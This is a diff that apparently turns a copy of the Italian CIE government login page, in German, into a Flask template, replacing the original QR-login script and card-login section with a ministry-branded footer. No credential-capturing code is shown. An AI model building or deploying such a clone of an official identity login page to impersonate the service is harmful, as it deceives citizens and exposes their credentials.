-			<p class="text-center c2"><a href="https://idserver.servizicie.interno.gov.it/idp/login/livello1e2postqrcode" title="Nachdem Sie den QR-Code gescannt haben, klicken Sie hier um fortzufahren">Clicca qui dopo aver autenticato tramite QR sulla APP</a></p>
-		</div>
-	</div>
-</div>
-<script>
-	$(document).ready(function() {
-		if( !is.mobile() ){
-			$("#qrWrapper").removeClass("d-none"); //tablet/desktop
 
-			checkQRScanned();
+        </div><!-- /wrapperL12 .container-->
+    </div><!-- /wrapperL12 -->
 
-			var tempoQR = parseInt("117488");
-
-			countdownQR( Date.now() + tempoQR );
-		}
-	});
-</script>
+    <!-- footer -->
 
 
 
-											</div>
-										</div>
+    <footer class="it-footer  mt-auto ">
 
-									</div>
-								</div>
-							</div>
-								
-					</div>
-					<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
-				</div>
+        <div class="it-footer-small-prints">
+            <div class="container py-3 text-white px-3 px-md-0">
 
-				
+                <div class="row">
+                    <div class="col-12 col-lg-3">
+                        <div class="row">
+                            <div class="col-4">
+                                <p class="mb-3 opacity">Projekt von</p>
+                            </div>
+                            <div class="col">
+                                <img src="{{ url_for('static', filename='login_cie_deu/ministero_white.png') }}"
+                                    alt="Ministero dell'Interno">
+                                <img src="{{ url_for('static', filename='login_cie_deu/ipzs.png') }}"
+                                    alt="Istituto Poligrafico e Zecca dello Stato Italiano" class="mt-2">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-12 col-lg-4 mt-4 mt-md-0 d-none d-sm-flex">
+                        <div class="py-2"></div>
+                        <div id="cieidapp" class="pl-sm-4">
+                            <div class="mb-3"><strong>CieID App</strong></div>
+                            <div class="row">
+                                <div class="col-3">
+                                    <img src="{{ url_for('static', filename='login_cie_deu/cieid.png') }}"
+                                        class="img-fluid cieid" alt="Logo App CieID">
+                                </div>
+                                <div class="col">
+                                    <p class="mb-1">
+                                        Die App, die Ihnen den Zugang zu den Online-Diensten mit Ihrer digitalen
+                                        Identität CieID ermöglicht.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-12 col-lg-4 my-auto stores d-none d-sm-flex">
+                        <div class="row">
+                            <div class="col text-right">
+                                <a href="https://apps.apple.com/it/app/cieid/id1504644677"
+                                    title="Laden Sie die App vom Apple Store herunter" target="_blank"><img
+                                        src="{{ url_for('static', filename='login_cie_deu/appstore@2x.png') }}"
+                                        class="img-fluid" alt="App Store"></a>
+                            </div>
+                            <div class="col">
+                                <a href="https://play.google.com/store/apps/details?id=it.ipzs.cieid&amp;hl=it"
+                                    title="Laden Sie die App vom Google Play Store herunter" target="_blank"><img
+                                        src="{{ url_for('static', filename='login_cie_deu/googleplay@2x.png') }}"
+                                        class="img-fluid" alt="Google Play"></a>
+                            </div>
+                        </div>
+                    </div>
 
+                </div>
 
-<div id="alternative">
-	<div class="row d-none d-sm-flex">
-		<div class="col-2 d-none d-lg-flex"></div>
-		<div class="col">
+            </div>
+        </div>
 
-			<div class="row py-2">
-				<div class="col"><hr></div>
-				<div class="col-2 mx-n1 mx-lg-n3"><p class="c2 text-center or">oder</p></div>
-				<div class="col"><hr></div>
-			</div>
-
-		</div>
-		<div class="col-2 d-none d-lg-flex"></div>
-	</div>
-
-	<div class="row">
-		<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
-		<div class="col mx-0 mx-sm-n4">
-			
-				<div class="card-wrapper card-space">
-					<div class="card card-bg card-big p-3 py-sm-0 mx-sm-0 mx-md-1">
-						<div class="card-body p-0 p-sm-4">
-							<h2>Einloggen mit Lesen der Karte</h2>
-							
-							<div class="row pt-2">
-								<div class="col-12 col-lg-8 pr-lg-4">
-									<p class="c2">
-										Sie können sich mit dem Lesen der Karte (Stufe 3) von einem 
-NFC-Smartphone mit der CieID-App anmelden, indem Sie die Karte 
-registrieren oder von einem PC mit der Software CIE und einem 
-Smart-Card-Reader.
-										<br><br>
-										<strong><a href="https://www.cartaidentita.interno.gov.it/la-carta/identificazione-digitale/" target="_blank" title="Einstieg mit App CieID">Erfahren Sie mehr.</a></strong><br>
-									</p>
-								</div>
-								<div class="col-12 col-lg-4 pl-lg-4 mt-3 mt-md-0 text-center">
-									<a id="switch2L3" href="https://ios.idserver.servizicie.interno.gov.it/idp/login/app?opId=_7e4bb538902a7e4282b9268b3a73246c_b7cf1246e7d5137f0effb1fb4dcfa74c&amp;challenge=OttfDtHebH%2BQFA%2B6xF8lAQ2LiR%2BOuymDgk8PLSg9&amp;level=3&amp;SPName=https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&amp;value=e2s1&amp;nextUrl=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2FAuthn%2FX509&amp;name=conversation&amp;authnRequestString=_7e4bb538902a7e4282b9268b3a73246c_b7cf1246e7d5137f0effb1fb4dcfa74c&amp;OpText=Inserisci+le+ultime+4+cifre+del+PIN+ricevute+insieme+alla+tua+Carta+di+Identit%C3%A0+Elettronica+per+accedere+a+https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;imgUrl=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png" class="btn btn-primary btn-image btn-card mb-2 text-nowrap w-100">Einloggen mit Lesen der Karte</a>
-								</div>
-							</div>
-	
-						</div>
-					</div>
-				</div>
-					
-		</div>
-		<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
-	</div>
-
-</div>
-
-
-			</div><!-- /wrapperL12 .container-->
-		</div><!-- /wrapperL12 -->
-
-		<!-- footer -->
+    </footer>
+    <!-- /footer -->
 
 
 
-<footer class="it-footer  mt-auto ">
 
-    <div class="it-footer-small-prints">
-		<div class="container py-3 text-white px-3 px-md-0">
-	
-			<div class="row">
-				<div class="col-12 col-lg-3">
-					<div class="row">
-						<div class="col-4">
-							<p class="mb-3 opacity">Projekt von</p>
-						</div>
-						<div class="col">
-							<img src="{{ url_for('static', filename='login_cie_deu/ministero_white.png') }}" alt="Ministero dell'Interno">
-							<img src="{{ url_for('static', filename='login_cie_deu/ipzs.png') }}" alt="Istituto Poligrafico e Zecca dello Stato Italiano" class="mt-2">
-						</div>
-					</div>
-				</div>
-				<div class="col-12 col-lg-4 mt-4 mt-md-0 d-none d-sm-flex">
-					<div class="py-2"></div>
-					<div id="cieidapp" class="pl-sm-4">
-						<div class="mb-3"><strong>CieID App</strong></div>
-						<div class="row">
-							<div class="col-3">
-								<img src="{{ url_for('static', filename='login_cie_deu/cieid.png') }}" class="img-fluid cieid" alt="Logo App CieID">
-							</div>
-							<div class="col">
-								<p class="mb-1">
-									Die App, die Ihnen den Zugang zu den Online-Diensten mit Ihrer digitalen Identität CieID ermöglicht.
-								</p>
-							</div>
-						</div>
-					</div>
-				</div>
-				<div class="col-12 col-lg-4 my-auto stores d-none d-sm-flex">
-					<div class="row">
-						<div class="col text-right">
-							<a href="https://apps.apple.com/it/app/cieid/id1504644677" title="Laden Sie die App vom Apple Store herunter" target="_blank"><img src="{{ url_for('static', filename='login_cie_deu/appstore@2x.png') }}" class="img-fluid" alt="App Store"></a>
-						</div>
-						<div class="col">
-							<a href="https://play.google.com/store/apps/details?id=it.ipzs.cieid&amp;hl=it" title="Laden Sie die App vom Google Play Store herunter" target="_blank"><img src="{{ url_for('static', filename='login_cie_deu/googleplay@2x.png') }}" class="img-fluid" alt="Google Play"></a>
-						</div>
-					</div>
-				</div>
-			
-			</div>
-				
-		</div>
-	</div>
+</body>
 
-</footer>
-<!-- /footer -->
-
-
-	
-
-</body></html>
+</html>
